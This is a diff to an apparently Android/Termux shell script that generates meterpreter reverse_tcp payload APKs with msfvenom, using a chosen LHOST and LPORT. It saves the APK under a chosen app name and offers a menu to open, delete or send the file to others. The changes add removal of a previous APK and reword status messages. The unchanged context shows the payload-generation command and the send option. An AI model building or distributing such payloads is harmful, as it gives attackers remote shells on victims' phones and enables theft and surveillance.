@@ -85,6 +85,11 @@ NORM
 fi
 fi
 
+if [ -f "/sdcard/${app}.apk" ];then
+cd /sdcard
+rm "${app}.apk"
+fi
+
 echo;HIDE
 function payload() {
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /data/data/com.termux/files/usr/tmp/$app.apk
@@ -160,7 +165,7 @@ trap '' SIGTSTP
 trap '' SIGINT
 payload & progress_bar
 
-echo -e "\033[0m\033[1m[√] Payload Saved Dir : emulated/0/${app}.apk"
+echo -e "\e[0m[+] Payload Saved to : emulated/0/${app}.apk"
 echo
 echo -e "\e[0m==> Open: [O/o] :: Delete: [D/d] :: Send: [S/s] :: Payload: ${app}.apk"
 echo
@@ -172,7 +177,7 @@ elif [[ $ask = "s" ]] || [[ $ask = "S" ]]
         then cd /sdcard && xdg-open --send $app.apk
 elif [[ $ask = "d" ]] || [[ $ask = "D" ]]
         then cd /sdcard && rm $app.apk
-echo -e '\033[1;92m[\033[0m-\033[1;92m] Deleted.'
+echo -e "\e[1;92m[\e[0m-\e[1;92m] ${app}.apk Deleted."
 echo
 exit
 else echo 'Abort.'
